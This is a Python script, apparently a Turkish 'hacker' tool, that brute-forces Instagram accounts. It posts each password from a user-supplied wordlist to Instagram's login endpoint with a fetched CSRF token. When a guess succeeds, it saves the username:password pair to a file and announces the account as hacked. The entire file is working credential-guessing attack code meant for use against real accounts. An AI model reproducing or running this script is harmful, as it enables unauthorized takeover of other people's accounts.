import os
import sys
import json
from time import sleep
from datetime import datetime
import requests

def Logo():
    print('''\033[1;36m
==============================================
██╗  ██╗ ██████╗ ███████╗     ██████╗ ███████╗██╗     ██████╗ ██╗███╗   ██╗
██║  ██║██╔═══██╗██╔════╝    ██╔════╝ ██╔════╝██║     ██╔══██╗██║████╗  ██║
███████║██║   ██║███████╗    ██║  ███╗█████╗  ██║     ██║  ██║██║██╔██╗ ██║
██╔══██║██║   ██║╚════██║    ██║   ██║██╔══╝  ██║     ██║  ██║██║██║╚██╗██║
██║  ██║╚██████╔╝███████║    ╚██████╔╝███████╗███████╗██████╔╝██║██║ ╚████║
╚═╝  ╚═╝ ╚═════╝ ╚══════╝     ╚═════╝ ╚══════╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═══╝
 ----------------------------------------------\033[0m
                \033[1;32mBY HACKER\033[0m
                 \033[1;33mGokhan Yakut\033[0m
==============================================\033[0m''')

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def request_token():
    valid_token = "gokhanyakut04"  # Burada geçerli token'ı belirleyin
    input_token = input("\033[1;37mLütfen güvenlik token'ını girin => \033[0m")
    return input_token == valid_token

def attempt_login(session, username, password, csrf_token):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    timestamp = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf_token
    }
    return session.post(login_url, data=payload, headers=headers)

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print("\033[1;31mPassword file not found.\033[0m")
        sys.exit(1)

def get_csrf_token(session):
    link = 'https://www.instagram.com/accounts/login/'
    req = session.get(link)
    return req.cookies.get('csrftoken', None)

def print_social_media_icons():
    print('''\n\033[1;34m  Beni Sosyal Medyada Takip Edin:\033[0m
\033[1;32m  [📸] Instagram: \033[0mGokhan_yakut_04
\033[1;33m  [💬] WhatsApp: \033[0m+44 7833 319922
\033[1;35m  [🔗] GitHub: \033[0mhttps://github.com/Byyazilimci
\033[1;36m  [🐦] Twitter: \033[0m@bygokhanYakut
''')

def main():
    clear_console()
    print('')
    Logo()
    print_social_media_icons()
    
    if not request_token():
        print("\033[1;31mGeçersiz güvenlik token'ı!\033[0m")
        return

    username = input("\033[1;37mKullanıcı adı => \033[0m")
    passwords_file = input("\033[1;37mpass.txt şifre listesi => \033[0m")
    passwords = read_passwords(passwords_file)
    
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print("\033[1;31mCSRFTOKEN not found in cookies\033[0m")
            return
        
        print("\033[1;36mHesaba giriş yapılmaya çalışılıyor...\033[0m")
        
        for password in passwords:
            response = attempt_login(session, username, password, csrf_token)
            if 'checkpoint_url' in response.text or 'userId' in response.text:
                print(f'\033[1;32m --> Kullanıcı adı  : {username} --> Şifre : {password} --> İnstagram Hacklendi\033[0m')
                with open('Gokhan Yakut.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
                break
            if 'error' in response.text:
                print(f'\033[1;33m --> Kullanıcı adı  : {username} --> Şifre : {password} --> iki faktörlü kimlik doğrulama Tespit Edildi\033[0m')
            elif 'status' in response.text:
                print('---------------------------------------')
                print(f'\033[1;33m --> Kullanıcı adı  : {username} --> Şifre : {password} --> Şifre Yanlış\033[0m')
                print('\n\033[1;36mİnstagram hackleniyor, lütfen sabırlı olun!\033[0m')
                sleep(10)

if __name__ == "__main__":
    main()
